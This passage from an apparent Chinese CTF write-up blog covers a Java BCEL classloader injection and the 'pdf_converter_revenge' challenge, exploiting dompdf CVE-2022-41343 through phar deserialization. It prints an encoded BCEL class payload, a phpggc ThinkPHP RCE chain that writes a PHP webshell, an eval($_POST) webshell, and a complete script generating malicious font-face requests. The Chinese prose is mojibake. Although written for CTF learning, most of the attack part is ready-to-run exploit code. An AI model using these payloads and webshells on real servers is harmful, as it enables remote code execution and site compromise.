class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(calc.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span>+code);</span><br><span class="line">        Class.forName(<span class="string">&quot;$$BCEL$$&quot;</span>+code,<span class="literal">true</span>,<span class="keyword">new</span> <span class="title class_">ClassLoader</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ‰“å…¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.getValue(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper._main(split(&#x27;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmR$5dO$TA$U$3dC$b7$5d$ba$ae$C$c5$ef$_$aab$y$d2$ba$R$88$n$a91i$9ab4$db$WiS$82$3e$98$e92$d9N$d3$dd$r$bb$db$ba$80$fc$u_$d4$f8$e0$P$f0G$Z$ef$b4$84$Sa$92$993s$ee$99s$e7$de$cc$9f$bf$bf$7e$Dx$89$a7$G2$b8m$e0$O$ee$ce$e2$9e$c2$fb$3a$k$e8x$c8$90y$z$7d$Z$bfaH$VV$3a$MZ5$d8$X$Ms$b6$f4Ec$e8uE$d8$e6$dd$B19$3bp$f8$a0$c3C$a9$ce$a7$a4$W$f7d4$8e$85$ae$r$S$ee$j$M$84E2$a7$cc$90$fe$ecq$e93$dc$y$7c$b2$fb$7c$c4$ad$B$f7$5d$ab$V$87$d2w$cb$e3T$3ctG$M$8b$97$84$Z$8cZ$e2$88$83X$G$7e$a4c$89$c4$T3u$87$S$g$ad$60$Y$3abK$aaGdU$c2$X$ca$c3$84$8eY$jy$T$8f$f0$98$81wy$d4$cb$97$9c$fc$b1pzAq$cf$db$3a$e2$d5J$cc$5b$95$d5$f7$b22$fa$f8$b6$b3f$af$ef$f4$9d$eafRo$7f$Y$d6$db$b55$bb_K$9a$ad$8d$c3F$bb$3ej$i9$eb$8d$c3$ca$97m$b9$97$9c$7c$3d$s3$f1j$a3X$da$9f$ec$7b$c5$92$3c1$f1$E$cb$M$f3$ff$97O$d4$b4$a6f$b7$_$9c$98$K$jS2$b0$de5$cf$8acX$98$Kw$86$7e$y$3d$aa$c8pE$7cv$b8QX$b1$_h$a8C$9aH$E$rzV$b8$a4$bb$e7$a8$ed0pD$U$95$a9$ri$fa$Ej$a4$c0T$a3h$cd$d2$c9$od$84$e9$e7$3f$c0$be$d1f$G$G$ad$99$J$89$x$b4$9a$a7$7b$TW$J$b3$b8$869R$a9$cb$9b$84$wf$fc$c4L$$$f5$j$da$ee$d4$c1$m$E$r$caR$aa$a9$8b$81y$y$Q$e6hj$c4$yR$fc$3a$f9M$k$b3JS$a9$$$3c$c4$3cgA$3d$Z$5b$d0$df$g$abn$fd$D$f9$9fP$X$e8$C$A$A&#x27;,&#x27;,&#x27;))&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°çš„splitæ¥è·å–æ•°ç»„ï¼Œå› ä¸º_mainåªæ¥å—æ•°ç»„å‚æ•°</p><p><img src="../images/image-20230425224659954.png" alt="image-20230425224659954"></p><p><img src="../images/image-20230426104354659.png" alt="image-20230426104354659"></p><p>åœ¨è¿™é‡Œloadclassè¿”å›æ¶æ„ç±»ä¹‹åï¼Œç„¶åè°ƒç”¨äº†æ¶æ„ç±»é‡Œçš„_mainæ–¹æ³•ï¼Œç„¶åå°±åˆ°é¢˜ç›®çš„</p><p><code>context.getvalue()</code>æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šè°ƒç”¨åˆ°invokeæ–¹æ³•ï¼Œç„¶åè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><h2 id="pdf-converter-revenge"><a href="#pdf-converter-revenge" class="headerlink" title="pdf_converter_revenge"></a>pdf_converter_revenge</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230426105232681.png" alt="image-20230426105232681"></p><p>æŸ¥çœ‹ç»™çš„æºç å‘ç°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªè·¯åŠ²ï¼Œç„¶åå‘ç°äº†è¿™ä¸ªthinkphpç‰ˆæœ¬ï¼Œè¿™é‡Œçš„éé¢„æœŸè§£æ˜¯å¯ä»¥ç›´æ¥æ‹¿thinkphp   v5.0.21çš„pocç›´æ¥æ‰“</p><p><strong>æ¥ä¸‹æ¥è®²ä¸€ä¸‹é¢„æœŸè§£</strong></p><p><strong>è€ƒç‚¹ï¼šPharååºåˆ—åŒ–</strong></p><p><img src="../images/image-20230426105634466.png" alt="image-20230426105634466"></p><p>å‘ç°æœ‰ä¸€ä¸ªä¾èµ–å«åš<strong>dompdf</strong></p><p><a href="http://buaq.net/go-129526.html">CVE-2022-41343 - é€šè¿‡ Phar ååºåˆ—åŒ–çš„ RCE</a></p><p>è¿™é‡Œçš„è¯æ ¹æ®ç‰ˆæœ¬å·å»googleæœç´¢æ¼æ´çš„è¯ï¼Œè¿˜æ˜¯å¯ä»¥æœåˆ°ä¸€äº›æ¼æ´åˆ†ææ–‡ç« çš„</p><p><a href="https://www.ctfiot.com/79602.html">DomPDFåº“ååºåˆ—åŒ–RCEæ¼æ´åˆ†æ</a></p><p>è¿™ä¸¤ç¯‡æ–‡ç« éƒ½å¯ä»¥è¿›è¡Œå‚è€ƒ</p><p><strong>æ¼æ´ç‚¹</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerFont</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$remoteFile</span>, <span class="variable">$context</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    [...]</span><br><span class="line">        <span class="variable">$entry</span>[<span class="variable">$styleString</span>] = <span class="variable">$localFile</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Download the remote file</span></span><br><span class="line">        [<span class="variable">$protocol</span>] = <span class="title class_">Helpers</span>::<span class="title function_ invoke__">explode_url</span>(<span class="variable">$remoteFile</span>);</span><br><span class="line">        <span class="variable">$allowed_protocols</span> = <span class="variable language_">$this</span>-&gt;options-&gt;<span class="title function_ invoke__">getAllowedProtocols</span>();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$protocol</span>, <span class="variable">$allowed_protocols</span>)) &#123;</span><br><span class="line">            <span class="title class_">Helpers</span>::<span class="title function_ invoke__">record_warnings</span>(E_USER_WARNING, <span class="string">&quot;Permission denied on <span class="subst">$remoteFile</span>. The communication protocol is not supported.&quot;</span>, <span class="keyword">__FILE__</span>, <span class="keyword">__LINE__</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$allowed_protocols</span>[<span class="variable">$protocol</span>][<span class="string">&quot;rules&quot;</span>] <span class="keyword">as</span> <span class="variable">$rule</span>) &#123;</span><br><span class="line">            [<span class="variable">$result</span>, <span class="variable">$message</span>] = <span class="variable">$rule</span>(<span class="variable">$remoteFile</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="title class_">Helpers</span>::<span class="title function_ invoke__">record_warnings</span>(E_USER_WARNING, <span class="string">&quot;Error loading <span class="subst">$remoteFile</span>: <span class="subst">$message</span>&quot;</span>, <span class="keyword">__FILE__</span>, <span class="keyword">__LINE__</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$remoteFileContent</span>, <span class="variable">$http_response_header</span>) = @<span class="title class_">Helpers</span>::<span class="title function_ invoke__">getFileContent</span>(<span class="variable">$remoteFile</span>, <span class="variable">$context</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$remoteFileContent</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426111849366.png" alt="image-20230426111849366"></p><p>ä¸»è¦é”™è¯¯å°±åœ¨è¿™ä¸€æ®µï¼Œåœ¨<code>if ($result !== true)</code>åå¹¶æ²¡æœ‰returnæ¥ç»“æŸï¼Œå› æ­¤å¯ä»¥è¿›å…¥<code>getFileContent</code>å‡½æ•°ï¼Œè¿™æ„å‘³ç€å¯ä»¥ä½¿ç”¨ä»»ä½•åè®®ï¼Œç„¶ååŒ…æ‹¬ä¸»è§’phar</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileContent</span>(<span class="params"><span class="variable">$uri</span>, <span class="variable">$context</span> = <span class="literal">null</span>, <span class="variable">$offset</span> = <span class="number">0</span>, <span class="variable">$maxlen</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="variable">$headers</span> = <span class="literal">null</span>;</span><br><span class="line">        [<span class="variable">$protocol</span>] = <span class="title class_">Helpers</span>::<span class="title function_ invoke__">explode_url</span>(<span class="variable">$uri</span>);</span><br><span class="line">        <span class="variable">$is_local_path</span> = <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$protocol</span>), [<span class="string">&quot;&quot;</span>, <span class="string">&quot;file://&quot;</span>, <span class="string">&quot;phar://&quot;</span>], <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$can_use_curl</span> = <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$protocol</span>), [<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span>], <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">set_error_handler</span>([<span class="built_in">self</span>::<span class="variable language_">class</span>, <span class="string">&#x27;record_warnings&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$is_local_path</span> || <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;allow_url_fopen&#x27;</span>) || !<span class="variable">$can_use_curl</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$is_local_path</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$uri</span> = <span class="title class_">Helpers</span>::<span class="title function_ invoke__">encodeURI</span>(<span class="variable">$uri</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$maxlen</span>)) &#123;</span><br><span class="line">                    <span class="variable">$result</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uri</span>, <span class="literal">false</span>, <span class="variable">$context</span>, <span class="variable">$offset</span>, <span class="variable">$maxlen</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$result</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uri</span>, <span class="literal">false</span>, <span class="variable">$context</span>, <span class="variable">$offset</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$content</span> = <span class="variable">$result</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$http_response_header</span>)) &#123;</span><br><span class="line">                    <span class="variable">$headers</span> = <span class="variable">$http_response_header</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="variable">$can_use_curl</span> &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;curl_exec&#x27;</span>)) &#123;</span><br><span class="line">         [...]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">restore_error_handler</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$content</span>, <span class="variable">$headers</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426112016718.png" alt="image-20230426112016718"></p><p>è¿™é‡Œå°±æ˜¯è§¦å‘pharååºåˆ—åŒ–çš„å…³é”®äº†</p><p>å¯ä»¥çœ‹åˆ°<code>file_get_contents</code>ï¼Œä¹‹åå°±ä¸èµ˜è¿°äº†ï¼Œæ¥ä¸‹æ¥è§£é‡Šä¸€ä¸‹å¤ç°æ­¥éª¤ï¼Œç”±äºé¢˜ç›®æ˜¯åŸºäºTP5çš„ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯å¯ä»¥æ‰“TP5çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ã€‚<br>é¦–å…ˆæˆ‘ä»¬è¦ç”Ÿæˆæ¶æ„å­—ä½“æ–‡ä»¶ï¼Œç”¨ä»¥ä¸‹è„šæœ¬å»ç”Ÿæˆï¼š</p><p>è„šæœ¬æ˜¯ä¸Šé¢çš„åˆ†ææ–‡ç« é‡Œå†™çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> fontforge</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    sys.stdout.buffer.write(do_generate_font())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_generate_font</span>() -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    fd, fn = tempfile.mkstemp(suffix=<span class="string">&quot;.ttf&quot;</span>)</span><br><span class="line">    os.close(fd)</span><br><span class="line">    font = fontforge.font()</span><br><span class="line">    font.copyright = <span class="string">&quot;DUMMY FONT&quot;</span></span><br><span class="line">    font.generate(fn)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(fn, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        res = f.read()</span><br><span class="line">    os.unlink(fn)</span><br><span class="line">    result = res</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚ç‡ä¼šæŠ¥é”™fontæ¨¡å—æ²¡æ‰¾åˆ°<code>apt-get install python3-fontforge</code>å®‰è£…ä¸€ä¸‹<br>ä¹‹åå¯ä»¥ç”Ÿæˆå¯ä»¥fontï¼š</p><p><img src="../images/image-20230426114443537.png" alt="image-20230426114443537"></p><p>å°±æ˜¯æŠŠpythonè„šæœ¬ç”Ÿæˆçš„å†…å®¹ç»™åˆ°<code>font.ttf</code>é‡Œé¢</p><p><strong>ç„¶åå°±å¼€å§‹ä½¿ç”¨phpggcæ¥ç”Ÿæˆpayload</strong></p><p>PHPGGCæ˜¯ä¸€æ¬¾èƒ½å¤Ÿè‡ªåŠ¨ç”Ÿæˆä¸»æµæ¡†æ¶çš„åºåˆ—åŒ–æµ‹è¯•payloadçš„å·¥å…·,å¯ä»¥è¯´æ˜¯ååºåˆ—åŒ–çš„æ­¦å™¨åº“,å¹³æ—¶é‡åˆ°æœ‰å…³ååºåˆ—åŒ–çš„é¢˜ç›®æ—¶å¦‚æœèƒ½å¤Ÿç†Ÿç»ƒè¿ç”¨å®ƒï¼Œå°†èŠ‚çœå¤§é‡åŠŸå¤«</p><p><code>./phpggc -l</code>    æŸ¥çœ‹å¯åˆ©ç”¨çš„ååºåˆ—åŒ–é“¾</p><p><img src="../images/image-20230426195919698.png" alt="image-20230426195919698"></p><p>è¿™é‡Œæ ¹æ®é¢˜ç›®çš„thinkphpç‰ˆæœ¬æ¥è¿›è¡Œé€‰</p><p><code>./phpggc ThinkPHP/FW1 &lt;remote_path&gt; &lt;local_path&gt;</code><br>ç”¨æ³•å¦‚ä¸Šï¼Œremote_pathæ˜¯è¦å†™å…¥é¶åœºçš„ä½ç½®ï¼Œlocal_pathæ˜¯ä½ shellæ–‡ä»¶çš„ä½ç½®ã€‚<br>éœ€è¦æ³¨æ„çš„æ˜¯ã€‚tp5çš„è¯å†™å…¥publicæ–‡ä»¶å¤¹ä¸‹ã€‚å› ä¸ºåªæœ‰publicæ–‡ä»¶å¤¹ä¸‹æˆ‘ä»¬å¯ä»¥è®¿é—®<br>è¿™é‡Œæˆ‘å‡†å¤‡çš„shellå¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426200140792.png" alt="image-20230426200140792"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d phar.<span class="keyword">readonly</span>=<span class="number">0</span> phpggc ThinkPHP/RCE2 system <span class="string">&quot;echo &#x27;&lt;?php system(<span class="subst">$_GET</span>[0]); ?&gt;&#x27; &gt; /var/www/html/public/mochu7.php&quot;</span> -p phar -pp font.ttf -o font-polyglot.phar</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426201055420.png" alt="image-20230426201055420"></p><p><strong>ç„¶åç”¨ä¸‹é¢çš„è„šæœ¬ç”Ÿæˆpayload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">PAYLOAD_TEMPLATE_URL_ENCODED = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;%s&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">PAYLOAD_TEMPLATE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">    @font-face &#123;</span></span><br><span class="line"><span class="string">        font-family:&#x27;exploit&#x27;;</span></span><br><span class="line"><span class="string">        src:url(&#x27;%s&#x27;);</span></span><br><span class="line"><span class="string">        font-weight:&#x27;normal&#x27;;</span></span><br><span class="line"><span class="string">        font-style:&#x27;normal&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_args</span>():</span><br><span class="line">    parser = argparse.ArgumentParser( prog=<span class="string">&quot;generate_payload.py&quot;</span>,</span><br><span class="line">                      formatter_class=<span class="keyword">lambda</span> prog: argparse.HelpFormatter(prog,max_help_position=<span class="number">50</span>),</span><br><span class="line">                      epilog= <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                       This script will generate payloads for CVE-2022-41343</span></span><br><span class="line"><span class="string">                      &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;file&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Polyglot File&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--path&quot;</span>, default=<span class="string">&quot;/var/www/&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Base path to vendor directory (Default = /var/www/)&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    args = get_args()</span><br><span class="line">    file = args.file.strip()</span><br><span class="line">    path = args.path.strip()</span><br><span class="line">    <span class="keyword">if</span>(os.path.exists(file)):</span><br><span class="line">        generate_payloads(file, path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: File doesn&#x27;t exist.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payloads</span>(<span class="params">file, path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        fc = f.read()</span><br><span class="line">    b64 = base64.b64encode(fc)</span><br><span class="line">    data_uri_pure = <span class="string">&quot;data:text/plain;base64,%s&quot;</span> % b64.decode()</span><br><span class="line">    data_uri_double_encoded = <span class="string">&quot;data:text/plain;base64,%s&quot;</span> % urllib.parse.quote_plus(urllib.parse.quote_plus(b64.decode()))</span><br><span class="line">    md5 = hashlib.md5(urllib.parse.unquote(data_uri_double_encoded).encode()).hexdigest()</span><br><span class="line">    <span class="comment"># è®¡ç®—md5è¿™é‡Œï¼Œå› ä¸ºå¤§ä½¬è¿™é‡Œæ˜¯ä¸¤æ¬¡urlç¼–ç ï¼Œä½†æ˜¯ä¸Šä¼ ä¹‹åæœåŠ¡å™¨æ¥æ”¶ä¼šè§£ä¸€æ¬¡urlï¼ŒdompdfçœŸæ­£å¤„ç†çš„æ•°æ®åº”è¯¥æ˜¯ç»è¿‡ä¸€æ¬¡urlè§£ç çš„æ•°æ®ï¼Œæ‰€ä»¥è®¡ç®—md5éœ€è¦è§£ä¸€æ¬¡urlç¼–ç æ‰æ˜¯æ­£ç¡®çš„æ–‡ä»¶å</span></span><br><span class="line">    phar_uri = <span class="string">&quot;phar://%s/vendor/dompdf/dompdf/lib/fonts/exploit_normal_%s.ttf##&quot;</span> % (path,md5)</span><br><span class="line">    req1_enc = PAYLOAD_TEMPLATE_URL_ENCODED % data_uri_double_encoded</span><br><span class="line">    req2_enc = PAYLOAD_TEMPLATE_URL_ENCODED % urllib.parse.quote_plus(phar_uri)</span><br><span class="line">    req1_pure = PAYLOAD_TEMPLATE % data_uri_double_encoded</span><br><span class="line">    req2_pure = PAYLOAD_TEMPLATE % phar_uri</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 1 ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req1_enc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 2 ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req2_enc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 1 NOT ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req1_pure)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 2 NOT ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req2_pure)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="number">1.</span>py -p <span class="string">&quot;/var/www/html&quot;</span> font-polyglot.phar</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426201328406.png" alt="image-20230426201328406"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">====== REQUEST 1 ENCODED =======</span><br><span class="line"></span><br><span 